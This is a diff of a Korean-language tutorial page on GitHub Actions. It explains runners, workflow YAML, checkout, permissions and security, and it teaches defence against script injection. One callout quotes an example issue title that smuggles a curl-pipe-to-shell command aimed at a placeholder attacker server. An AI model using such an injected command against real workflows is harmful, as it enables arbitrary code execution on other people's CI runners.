@@ -1,17 +1,45 @@
 <h1>Step 3 · GitHub Actions 자동화</h1>
-<p class="lede">"이슈가 열리면 → Windows PC를 빌려서 → 엑셀을 변환하고 → 결과를 커밋해라." 이 문장을 GitHub이 알아듣는 YAML로 쓰는 단계입니다.</p>
+<p class="lede">"이슈가 열리면 → GitHub 클라우드에 진짜 Windows 서버를 하나 띄워서 → 엑셀을 변환하고 → 결과를 커밋해라." 이 문장을 GitHub이 알아듣는 YAML로 쓰는 단계입니다.</p>
 
-<h2>잠깐 이론: GitHub Actions의 4요소</h2>
-<div class="cards">
-  <div class="card card-work"><span class="card-icon">⚡</span><h3>Event (on)</h3><p>무엇이 일어나면 실행할지. push, pull_request, issues, 정해진 시간(schedule), 수동 실행 등.</p></div>
-  <div class="card card-repo"><span class="card-icon">🧩</span><h3>Job</h3><p>한 대의 runner에서 실행되는 작업 묶음. Job끼리는 기본적으로 <b>병렬</b>로 돌아요.</p></div>
-  <div class="card card-stage"><span class="card-icon">🖥️</span><h3>Runner (runs-on)</h3><p>GitHub이 빌려주는 일회용 가상 PC. ubuntu / windows / macos 중 선택.</p></div>
-  <div class="card card-remote"><span class="card-icon">📝</span><h3>Step</h3><p>순서대로 실행되는 명령. <code>run:</code>은 셸 명령, <code>uses:</code>는 남이 만든 Action 재사용.</p></div>
-</div>
+<section class="theory">
+  <h2>📚 시작 전 이론: GitHub Actions가 동작하는 방식</h2>
+  <p>
+    이 Step에서 쓰는 YAML 몇십 줄이 <b>진짜 클라우드 서버에서 실제 명령을 실행</b>합니다. 그만큼 권한과 보안을 이해하고 써야 해요.
+    실행 모델 → runner → 문법 → 보안 순서로 정리합니다.
+  </p>
+  <dl class="theory-terms">
+    <div><dt>Workflow</dt><dd><code>.github/workflows/*.yml</code> 파일 하나. "언제, 어디서, 무엇을" 실행할지 적은 자동화 설계도.</dd></div>
+    <div><dt>Action</dt><dd>남이 만들어 공개한 재사용 부품. <code>uses: actions/checkout@v6</code>처럼 <code>이름@버전</code>으로 불러 씁니다.</dd></div>
+    <div><dt>Context · 표현식</dt><dd><code>${{ github.event.issue.title }}</code>처럼 실행 정보를 꺼내 쓰는 문법. <b>셸이 실행되기 전에</b> 글자 그대로 치환돼요.</dd></div>
+    <div><dt>GITHUB_TOKEN</dt><dd>GitHub이 실행마다 자동으로 발급하는 임시 토큰. 해당 저장소에만 쓸 수 있고, job이 끝나면 만료됩니다.</dd></div>
+    <div><dt>permissions</dt><dd>GITHUB_TOKEN에 줄 권한 목록. <code>contents: write</code>처럼 필요한 것만 적는 것이 원칙(최소 권한).</dd></div>
+    <div><dt>Secret</dt><dd>API 키 같은 비밀 값을 저장소 설정에 암호화해 보관하는 곳. 워크플로우에서 <code>${{ secrets.이름 }}</code>으로 꺼내고, 로그에는 <code>***</code>로 가려져요.</dd></div>
+  </dl>
 
-<h3>워크플로우 파일 해부</h3>
-<p><code>.github/workflows/</code> 폴더 안의 <code>.yml</code> 파일이 곧 워크플로우입니다. 들여쓰기(스페이스 2칸)가 의미를 가지니 주의하세요.</p>
-<pre data-lang="yaml">name: Excel → Dashboard          # Actions 탭에 보이는 이름
+  <h3>실행 모델: Event → Workflow → Job → Step</h3>
+  <div class="cards">
+    <div class="card card-work"><span class="card-icon">⚡</span><h3>Event (on)</h3><p>무엇이 일어나면 실행할지. push, pull_request, issues, 정해진 시간(schedule), 수동 실행 등.</p></div>
+    <div class="card card-repo"><span class="card-icon">🧩</span><h3>Job</h3><p>한 대의 runner에서 실행되는 작업 묶음. Job끼리는 기본적으로 <b>병렬</b>로 돌아요.</p></div>
+    <div class="card card-stage"><span class="card-icon">🖥️</span><h3>Runner (runs-on)</h3><p>job을 실제로 실행하는 컴퓨터. GitHub-hosted runner는 job마다 <b>새로 만들어지는 실제 VM</b>이고, ubuntu / windows / macos 중 고릅니다.</p></div>
+    <div class="card card-remote"><span class="card-icon">📝</span><h3>Step</h3><p>순서대로 실행되는 명령. <code>run:</code>은 셸 명령, <code>uses:</code>는 남이 만든 Action 재사용.</p></div>
+  </div>
+
+  <h3>runner = job마다 새로 만들어지는 진짜 서버</h3>
+  <p>
+    <code>runs-on: windows-latest</code>라고 쓰면 GitHub이 자기 클라우드(Microsoft Azure)에 <b>깨끗한 Windows Server VM을 새로 만들어</b> 이 job 하나에만 배정합니다.
+    여러분의 파이썬 코드는 그 서버에서 <b>실제로 실행</b>되고, job이 끝나면 VM은 통째로 폐기돼요. 이 사실에서 중요한 결론이 몇 가지 나옵니다.
+  </p>
+  <ul>
+    <li><b>처음엔 빈 컴퓨터</b> — 저장소 코드조차 없어요. 그래서 첫 step이 항상 <code>actions/checkout</code>입니다.</li>
+    <li><b>아무것도 남지 않음</b> — 만든 파일은 job이 끝나면 사라지므로, 결과물은 커밋·artifact 등으로 밖에 보내야 해요. 이번엔 <code>docs</code> 브랜치에 커밋합니다.</li>
+    <li><b>도구는 미리 깔려 있음</b> — Git, Python, Node, PowerShell 등 개발 도구가 설치된 이미지로 시작해요. 하지만 <b>Microsoft Office(Excel)는 없습니다.</b></li>
+    <li><b>이미지 버전은 바뀜</b> — <code>windows-latest</code>는 "현재 최신 안정 이미지"를 가리키는 별명이라 시간이 지나면 바뀌어요(현재는 Windows Server 2025 계열). 실제 버전은 실행 로그의 <b>Set up job → Runner Image</b>에서 확인할 수 있어요.</li>
+    <li><b>Windows의 기본 셸은 PowerShell</b> — <code>run:</code>은 기본적으로 <code>pwsh</code>로 실행되므로 환경 변수는 <code>$env:NAME</code>으로 읽어요. bash 스크립트를 돌릴 step에는 <code>shell: bash</code>를 따로 적습니다.</li>
+  </ul>
+
+  <h3>워크플로우 파일 해부</h3>
+  <p><code>.github/workflows/</code> 폴더 안의 <code>.yml</code> 파일이 곧 워크플로우입니다. 들여쓰기(스페이스 2칸)가 의미를 가지니 주의하세요.</p>
+  <pre data-lang="yaml">name: Excel → Dashboard          # Actions 탭에 보이는 이름
 
 on:                              # ⚡ 언제?
   issues:
@@ -24,34 +52,69 @@ permissions:                     # 🔑 이 워크플로우가 가진 권한 (�
 jobs:
   convert:                       # 🧩 Job 이름
     if: startsWith(github.event.issue.title, '[EXCEL]')
-    runs-on: windows-latest      # 🖥️ Windows 가상 PC를 빌린다
+    runs-on: windows-latest      # 🖥️ GitHub이 이 job 전용 Windows 서버(VM)를 새로 만든다
     steps:                       # 📝 순서대로 실행
-      - uses: actions/checkout@v4            # 저장소 코드 내려받기
-      - uses: actions/setup-python@v5        # 파이썬 설치
+      - uses: actions/checkout@v6            # 저장소 코드 내려받기
+      - uses: actions/setup-python@v6        # 파이썬 설치
         with: { python-version: "3.12" }
       - run: pip install -r scripts/requirements.txt
       - run: python scripts/excel_to_json.py input.xlsx --out build/data.json</pre>
 
-<figure class="shot" data-src="assets/img/screens/actions-run-detail.png">
-  <figcaption>Actions 탭의 실행 상세 화면 — 각 Step의 로그를 펼쳐 볼 수 있습니다</figcaption>
-</figure>
+  <figure class="shot" data-src="assets/img/screens/actions-run-detail.png">
+    <figcaption>Actions 탭의 실행 상세 화면 — 각 Step의 로그를 펼쳐 볼 수 있습니다</figcaption>
+  </figure>
 
-<h3>꼭 알아야 할 보안 두 가지</h3>
-<div class="callout callout-danger">
-  <span class="callout-title">1. 스크립트 인젝션: 이슈 제목/본문을 run: 에 직접 넣지 마세요</span>
-  이슈는 <b>아무나</b> 쓸 수 있는 입력입니다. 아래처럼 쓰면, 이슈 제목에 <code>"; curl 해커서버 | sh; echo "</code> 같은 걸 넣어 runner에서 임의 명령을 실행할 수 있어요.
-  <pre data-lang="yaml" data-nocopy># ❌ 위험
+  <h3>YAML에서 자주 하는 실수</h3>
+  <table>
+    <thead><tr><th>실수</th><th>결과와 해결</th></tr></thead>
+    <tbody>
+      <tr><td>탭 문자로 들여쓰기</td><td>YAML은 탭을 허용하지 않아요. 항상 스페이스</td></tr>
+      <tr><td>들여쓰기 한 칸 어긋남</td><td><code>steps:</code> 밖으로 빠지는 등 의미가 바뀜. Actions 탭에 빨간 오류로 표시됨</td></tr>
+      <tr><td><code>[</code>, <code>:</code>, <code>#</code>, <code>*</code>로 시작하거나 포함된 값</td><td>목록·주석 등으로 해석될 수 있어 <b>따옴표로 감싸기</b> (예: <code>title: "[EXCEL] "</code>)</td></tr>
+      <tr><td>파일 위치 오타</td><td><code>.github/workflows/</code>가 아니면 워크플로우로 인식되지 않음</td></tr>
+    </tbody>
+  </table>
+
+  <h3>checkout이 하는 일</h3>
+  <p>
+    <code>actions/checkout</code>은 빈 runner에 저장소를 clone해 줍니다. <code>issues</code> 이벤트일 때는 <b>기본 브랜치(main)의 최신 커밋</b>을 가져와요.
+    기본값은 최근 커밋 1개만 받는 얕은 clone이라 다른 브랜치(<code>docs</code>)는 들어 있지 않습니다. 그래서 배포 스크립트가 <code>git fetch origin docs</code>를 따로 해요.
+    또 checkout은 GITHUB_TOKEN을 Git 설정에 넣어 두기 때문에, 이후 step에서 별도 로그인 없이 <code>git push</code>가 됩니다.
+  </p>
+
+  <h3>권한: 누가 이 자동화를 깨울 수 있나?</h3>
+  <p>
+    공개 저장소의 이슈는 <b>GitHub 계정만 있으면 누구나</b> 열 수 있어요. 이벤트에는 작성자와 저장소의 관계가 <code>author_association</code>으로 들어 있습니다.
+    <code>OWNER</code>(소유자), <code>MEMBER</code>(조직 멤버), <code>COLLABORATOR</code>(초대된 협업자)만 허용하고, <code>CONTRIBUTOR</code>·<code>NONE</code> 등 나머지는 건너뛰게 하는 것이 이번 워크플로우의 문지기예요.
+    참고로 GITHUB_TOKEN으로 만든 push·이슈 같은 이벤트는 (무한 반복을 막기 위해) 새 워크플로우 실행을 만들지 않습니다.
+  </p>
+
+  <h3>꼭 알아야 할 보안 두 가지</h3>
+  <div class="callout callout-danger">
+    <span class="callout-title">1. 스크립트 인젝션: 이슈 제목/본문을 run: 에 직접 넣지 마세요</span>
+    <code>${{ }}</code>는 셸이 실행되기 <b>전에</b> 글자 그대로 붙여넣어집니다. 이슈는 <b>아무나</b> 쓸 수 있는 입력이라, 아래처럼 쓰면 이슈 제목에 <code>"; curl 해커서버 | sh; echo "</code> 같은 걸 넣어 runner에서 임의 명령을 실행할 수 있어요.
+    <pre data-lang="yaml" data-nocopy># ❌ 위험
 - run: echo "${{ github.event.issue.title }}"
 # ✅ 안전: 환경 변수로 전달하면 셸이 "명령"이 아닌 "값"으로 취급
 - env:
     TITLE: ${{ github.event.issue.title }}
   run: echo "$TITLE"</pre>
-</div>
-<div class="callout callout-warn">
-  <span class="callout-title">2. GITHUB_TOKEN과 Secrets</span>
-  워크플로우마다 GitHub이 자동으로 임시 토큰(<code>GITHUB_TOKEN</code>)을 발급합니다. 권한은 <code>permissions:</code>로 필요한 만큼만 주세요.
-  API 키 같은 비밀 값은 코드에 쓰지 말고 <b>Settings → Secrets and variables → Actions</b>에 저장한 뒤 <code>${{ secrets.이름 }}</code>으로 꺼내 씁니다. 로그에는 <code>***</code>로 가려져요.
-</div>
+  </div>
+  <div class="callout callout-warn">
+    <span class="callout-title">2. GITHUB_TOKEN과 Secrets</span>
+    워크플로우마다 GitHub이 자동으로 임시 토큰(<code>GITHUB_TOKEN</code>)을 발급합니다. 권한은 <code>permissions:</code>로 필요한 만큼만 주세요.
+    API 키 같은 비밀 값은 코드에 쓰지 말고 <b>Settings → Secrets and variables → Actions</b>에 저장한 뒤 <code>${{ secrets.이름 }}</code>으로 꺼내 씁니다. 로그에는 <code>***</code>로 가려져요.
+  </div>
+
+  <div class="theory-check"><b>✅ 실습 전 셀프 체크</b>
+    <ul>
+      <li>event · workflow · job · step · runner의 관계를 한 문장으로 설명할 수 있나요?</li>
+      <li>runner에서 만든 파일이 다음 실행 때 왜 남아 있지 않은지 설명할 수 있나요?</li>
+      <li><code>${{ github.event.issue.title }}</code>를 <code>run:</code>에 직접 쓰면 왜 위험한지 말할 수 있나요?</li>
+      <li><code>permissions:</code>에 <code>contents: write</code>와 <code>issues: write</code>가 각각 왜 필요한지 말할 수 있나요?</li>
+    </ul>
+  </div>
+</section>
 
 <h2>3-1. 이슈 템플릿 + 워크플로우 만들기</h2>
 <pre data-lang="bash">git switch -c feature/actions</pre>
